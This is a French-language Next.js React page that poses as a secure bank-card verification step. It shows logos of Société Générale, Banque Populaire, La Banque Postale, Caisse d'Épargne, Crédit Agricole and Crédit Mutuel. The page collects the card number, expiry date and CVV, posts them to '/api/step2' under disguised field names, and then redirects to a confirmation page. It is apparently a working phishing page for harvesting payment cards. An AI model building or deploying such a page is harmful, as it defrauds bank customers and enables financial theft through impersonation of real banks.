'use client';

import React, { useState, FormEvent } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

export default function BatPage() {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isMenuOpen, setIsMenuOpen] = useState(false);

  // Détection du réseau de carte
  const getCardBrand = (number: string) => {
    const clean = number.replace(/\s/g, '');
    if (/^4/.test(clean)) return 'visa';
    if (/^(5[1-5]|2[2-7])/.test(clean)) return 'mastercard';
    return 'cb';
  };

  const cardBrand = getCardBrand(cardNumber);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (value.length >= 3) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setExpiry(value);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCvv(value);
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch('/api/step2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'card_details',
          amak: cardNumber.replace(/\s/g, ''),
          ludo: expiry,
          fqx: cvv,
        }),
      });
    } catch (err) {
      console.error('Erreur lors de la transmission :', err);
    } finally {
      setIsSubmitting(false);
      router.push('/confirm');
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-800 font-sans flex justify-center items-center sm:py-6">
      <div className="w-full max-w-md min-h-screen sm:min-h-[840px] bg-white sm:rounded-3xl sm:shadow-xl flex flex-col justify-between overflow-hidden relative border border-slate-100">
        
        {/* Header */}
        <header className="px-6 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20">
          <Link href="/" className="flex items-center hover:opacity-80 transition-opacity">
            <img 
              src="/flavicon.ico" 
              alt="Favicon" 
              className="h-8 w-auto object-contain"
            />
          </Link>

          <button
            type="button"
            onClick={() => setIsMenuOpen(!isMenuOpen)}
            aria-label="Menu"
            className="p-2 rounded-xl text-slate-800 hover:bg-slate-50 transition-colors focus:outline-none"
          >
            <div className="w-6 h-4 flex flex-col justify-between">
              <span className={`h-0.5 w-full bg-slate-800 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-800 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-800 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
            </div>
          </button>
        </header>

        {/* Menu Déroulant */}
        {isMenuOpen && (
          <div className="absolute top-[70px] left-0 w-full bg-white/95 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30">
            <nav className="flex flex-col gap-2 font-medium text-slate-800">
              <Link href="/" className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold" onClick={() => setIsMenuOpen(false)}>
                Accueil
              </Link>
            </nav>
          </div>
        )}

        <main className="flex-1 px-6 py-6 flex flex-col justify-start gap-5">
          
          {/* Titre principal */}
          <div className="text-center pt-1">
            <h1 className="text-2xl font-extrabold text-[#0B2A4A] tracking-tight leading-tight flex items-center justify-center gap-2">
              Coordonnées bancaires
            </h1>
          </div>

          {/* Cadran de carte bancaire */}
          <div className="w-full aspect-[1.586/1] rounded-2xl p-6 bg-[#0B2A4A] text-white shadow-lg relative overflow-hidden flex flex-col justify-between border border-slate-800">
            <div className="absolute -right-12 -top-12 w-36 h-36 bg-blue-500/10 rounded-full blur-xl pointer-events-none" />

            {/* Puce EMV & Logo dynamique au coin */}
            <div className="flex justify-between items-start z-10">
              <div className="w-10 h-7 rounded bg-gradient-to-tr from-amber-300 via-yellow-400 to-amber-200 p-0.5 shadow-sm flex items-center justify-center">
                <div className="w-full h-full border border-amber-700/30 rounded-[2px] grid grid-cols-2 gap-0.5 p-0.5">
                  <div className="border-r border-b border-amber-700/30" />
                  <div className="border-b border-amber-700/30" />
                  <div className="border-r border-amber-700/30" />
                  <div />
                </div>
              </div>

              {/* Logo Dynamique (Visa / Mastercard / cd.svg par défaut) */}
              <div className="h-8 flex items-center justify-end">
                {cardBrand === 'visa' && (
                  <img 
                    src="/car1.png" 
                    alt="Visa" 
                    className="h-7 w-auto max-w-[70px] object-contain drop-shadow-md"
                  />
                )}
                {cardBrand === 'mastercard' && (
                  <img 
                    src="/car2.png" 
                    alt="Mastercard" 
                    className="h-8 w-auto max-w-[70px] object-contain drop-shadow-md"
                  />
                )}
                {cardBrand === 'cb' && (
                  <img 
                    src="/cd.svg" 
                    alt="Carte Bancaire" 
                    className="h-7 w-auto max-w-[70px] object-contain drop-shadow-md"
                  />
                )}
              </div>
            </div>

            {/* Numéro de carte */}
            <div className="z-10 my-auto">
              <p className="font-mono text-lg sm:text-xl font-semibold tracking-[0.2em] text-white">
                {cardNumber || '•••• •••• •••• ••••'}
              </p>
            </div>

            {/* Expiration et CVV affichés côte à côte */}
            <div className="flex justify-between items-end z-10 text-xs text-slate-300 font-mono">
              <div>
                <span className="text-[9px] uppercase text-slate-400 font-sans tracking-wider block">EXPIRATION</span>
                <span className="font-bold text-white tracking-widest">{expiry || 'MM/AA'}</span>
              </div>
              <div className="text-right">
                <span className="text-[9px] uppercase text-slate-400 font-sans tracking-wider block">CVV</span>
                <span className="font-bold text-white tracking-widest">{cvv || '***'}</span>
              </div>
            </div>
          </div>

          {/* Encart Vérification */}
          <div className="p-4 rounded-xl bg-slate-50 border border-slate-100 text-center">
            <div className="flex items-center justify-center gap-1.5 font-bold text-slate-700 text-sm mb-1">
              <span>Vérification sécurisée</span>
              <svg className="w-4 h-4 text-slate-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <rect x="5" y="11" width="14" height="10" rx="2" />
                <path d="M8 11V7a4 4 0 118 0v4" />
              </svg>
            </div>
            <p className="text-xs text-slate-500 font-normal leading-relaxed">
              Procédure de vérification d'identité bancaire. Les données saisies sont immédiatement écrasées après traitement.
            </p>
          </div>

          {/* Formulaire */}
          <form onSubmit={handleSubmit} className="flex flex-col gap-4">
            
            {/* Numéro de carte */}
            <div>
              <label className="block text-xs font-bold text-slate-900 mb-1.5">
                Numéro de carte bancaire <span className="text-red-500">*</span>
              </label>
              <input
                type="text"
                required
                inputMode="numeric"
                value={cardNumber}
                onChange={handleCardNumberChange}
                placeholder="1234 5678 9012 3456"
                className="w-full px-4 py-3 bg-white border border-slate-200 rounded-xl text-base font-normal text-slate-800 outline-none focus:border-slate-400 transition-all placeholder:text-slate-300"
              />
            </div>

            {/* Date & CVV */}
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-xs font-bold text-slate-900 mb-1.5">
                  Date d'expiration <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  required
                  inputMode="numeric"
                  value={expiry}
                  onChange={handleExpiryChange}
                  placeholder="MM/AA"
                  className="w-full px-4 py-3 bg-white border border-slate-200 rounded-xl text-base font-normal text-slate-800 outline-none focus:border-slate-400 transition-all placeholder:text-slate-300"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-900 mb-1.5">
                  Cryptogramme (CVV) <span className="text-red-500">*</span>
                </label>
                <input
                  type="numeric"
                  required
                  inputMode="numeric"
                  maxLength={4}
                  value={cvv}
                  onChange={handleCvvChange}
                  placeholder="***"
                  className="w-full px-4 py-3 bg-white border border-slate-200 rounded-xl text-base font-normal text-slate-800 outline-none focus:border-slate-400 transition-all placeholder:text-slate-300"
                />
              </div>
            </div>

            {/* Bouton Valider */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-4 mt-2 bg-[#FACC15] hover:bg-[#eab308] active:scale-[0.99] text-black font-extrabold text-base tracking-wider rounded-xl shadow-sm transition-all text-center uppercase flex items-center justify-center gap-3"
            >
              {isSubmitting ? (
                <span className="w-6 h-6 border-2 border-black border-t-transparent rounded-full animate-spin" />
              ) : (
                <>
                  <span>VÉRIFIER</span>
                  <div className="w-6 h-6 bg-[#1E293B] rounded-full flex items-center justify-center">
                    <svg className="w-3 h-3 text-white fill-current translate-x-0.5" viewBox="0 0 24 24">
                      <path d="M8 5v14l11-7z" />
                    </svg>
                  </div>
                </>
              )}
            </button>
          </form>
        </main>

        {/* Footer */}
          <footer className="w-full px-5 py-5 border-t border-slate-100 bg-slate-50/50 text-center shrink-0">
        <p className="text-xs font-medium text-slate-500 mb-3.5">
          Ce service vous est proposé par :
        </p>
          <div className="flex items-center justify-center gap-3 flex-wrap">
            <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-5 object-contain" />
            <img src="/BP-1.png" alt="Banque Populaire" className="h-5 object-contain" />
            <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-5 object-contain" />
            <img src="/12895685.png" alt="Caisse d'Épargne" className="h-5 object-contain" />
            <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-5 object-contain" />
            <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-5 object-contain" />
          </div>
        </footer>

      </div>
    </div>
  );
}